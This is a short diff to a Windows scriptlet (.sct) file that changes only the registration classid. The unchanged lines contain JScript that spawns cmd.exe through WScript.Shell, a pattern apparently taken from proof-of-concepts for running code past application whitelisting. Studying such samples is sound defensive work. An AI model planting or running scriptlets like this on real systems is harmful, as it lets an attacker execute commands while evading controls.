@@ -2,7 +2,7 @@
 <scriptlet>
 <registration
     progid="BOB1"
-    classid="{A1112222-0000-0000-3000-000DA00DABFC}" >
+    classid="{11111111-0000-0000-3000-000DA00DABFC}" >
     <script language="JScript">
       <![CDATA[
         var foo = new ActiveXObject("WScript.Shell").Run("cmd.exe"); 
